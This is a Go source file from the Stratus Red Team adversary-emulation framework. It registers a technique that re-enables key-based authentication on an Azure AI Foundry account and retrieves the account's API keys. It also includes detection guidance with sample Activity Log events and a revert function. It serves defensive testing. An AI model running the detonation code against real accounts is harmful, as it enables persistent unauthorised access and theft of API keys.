package azure

import (
	"context"
	_ "embed"
	"fmt"
	"log"

	"github.com/Azure/azure-sdk-for-go/sdk/resourcemanager/cognitiveservices/armcognitiveservices"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
)

//go:embed main.tf
var tf []byte

func init() {
	const codeBlock = "```"
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "azure.persistence.exfiltrate-foundry-key",
		FriendlyName: "Enable Local Authentication and Exfiltrate Azure AI Foundry API Keys",
		Description: `
Re-enables local (key-based) authentication on an Azure AI Foundry (Cognitive Services) account that had it disabled, then retrieves the account's API keys.

An attacker with sufficient permissions on a Cognitive Services account can flip the ` + "`disableLocalAuth`" + ` property from ` + "`true`" + ` to ` + "`false`" + `, then call ` + "`ListKeys`" + ` to obtain the primary and secondary API keys. These keys provide persistent, anonymous access to AI Foundry data-plane operations.

Warm-up:

- Create an Azure Cognitive Services (AI Foundry) account with local authentication disabled

Detonation:

- Update the account to set ` + "`properties.disableLocalAuth`" + ` to ` + "`false`" + `
- Call ` + "`ListKeys`" + ` to retrieve the account's API keys

References:

- https://learn.microsoft.com/en-us/azure/ai-services/disable-local-auth
- https://learn.microsoft.com/en-us/rest/api/cognitiveservices/accountmanagement/accounts/list-keys
`,
		Detection: `
Identify changes to the Cognitive Services account configuration through Azure Activity logs.

Look for two operations in sequence:

1. <code>Microsoft.CognitiveServices/accounts/write</code> — the account update that re-enables local authentication
2. <code>Microsoft.CognitiveServices/accounts/listKeys/action</code> — the key retrieval

Sample events (redacted for clarity):

` + codeBlock + `json hl_lines="3"
{
  "authorization": {
    "action": "Microsoft.CognitiveServices/accounts/write",
    "scope": "/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.CognitiveServices/accounts/<account-name>"
  },
  "caller": "user@example.com",
  "category": {
    "value": "Administrative"
  },
  "operationName": {
    "value": "Microsoft.CognitiveServices/accounts/write"
  },
  "resourceId": "/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.CognitiveServices/accounts/<account-name>",
  "status": {
    "value": "Started"
  },
  "properties": {
    "message": "Microsoft.CognitiveServices/accounts/write"
  }
}
` + codeBlock + `

` + codeBlock + `json hl_lines="3"
{
  "authorization": {
    "action": "Microsoft.CognitiveServices/accounts/listKeys/action",
    "scope": "/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.CognitiveServices/accounts/<account-name>"
  },
  "caller": "user@example.com",
  "category": {
    "value": "Administrative"
  },
  "operationName": {
    "value": "Microsoft.CognitiveServices/accounts/listKeys/action"
  },
  "resourceId": "/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.CognitiveServices/accounts/<account-name>",
  "status": {
    "value": "Succeeded"
  },
  "properties": {
    "statusCode": "OK",
    "message": "Microsoft.CognitiveServices/accounts/listKeys/action"
  }
}
` + codeBlock + `
`,
		Platform:                   stratus.Azure,
		IsIdempotent:               true,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Persistence, mitreattack.CredentialAccess},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	accountName := params["cognitive_account_name"]
	resourceGroup := params["resource_group_name"]

	client, err := getCognitiveServicesClient(providers)
	if err != nil {
		return err
	}

	log.Println("Re-enabling local authentication on Cognitive Services account " + accountName)
	disableLocalAuth := false
	poller, err := client.BeginUpdate(context.Background(), resourceGroup, accountName, armcognitiveservices.Account{
		Properties: &armcognitiveservices.AccountProperties{
			DisableLocalAuth: &disableLocalAuth,
		},
	}, nil)
	if err != nil {
		return fmt.Errorf("failed to update Cognitive Services account: %w", err)
	}
	_, err = poller.PollUntilDone(context.Background(), nil)
	if err != nil {
		return fmt.Errorf("failed to poll update of Cognitive Services account: %w", err)
	}
	log.Println("Successfully re-enabled local authentication on account " + accountName)

	log.Println("Listing keys for Cognitive Services account " + accountName)
	keysResult, err := client.ListKeys(context.Background(), resourceGroup, accountName, nil)
	if err != nil {
		return fmt.Errorf("failed to list keys for Cognitive Services account: %w", err)
	}
	if keysResult.Key1 != nil {
		log.Printf("Successfully retrieved API keys for account %s (key1: %s...)\n", accountName, (*keysResult.Key1)[:8])
	}

	return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	accountName := params["cognitive_account_name"]
	resourceGroup := params["resource_group_name"]

	client, err := getCognitiveServicesClient(providers)
	if err != nil {
		return err
	}

	log.Println("Disabling local authentication on Cognitive Services account " + accountName)
	disableLocalAuth := true
	poller, err := client.BeginUpdate(context.Background(), resourceGroup, accountName, armcognitiveservices.Account{
		Properties: &armcognitiveservices.AccountProperties{
			DisableLocalAuth: &disableLocalAuth,
		},
	}, nil)
	if err != nil {
		return fmt.Errorf("failed to update Cognitive Services account: %w", err)
	}
	_, err = poller.PollUntilDone(context.Background(), nil)
	if err != nil {
		return fmt.Errorf("failed to poll update of Cognitive Services account: %w", err)
	}
	log.Println("Successfully disabled local authentication on account " + accountName)

	return nil
}

func getCognitiveServicesClient(providers stratus.CloudProviders) (*armcognitiveservices.AccountsClient, error) {
	azure := providers.Azure()
	client, err := armcognitiveservices.NewAccountsClient(azure.SubscriptionID, azure.GetCredentials(), azure.ClientOptions)
	if err != nil {
		return nil, fmt.Errorf("failed to create Cognitive Services client: %w", err)
	}
	return client, nil
}
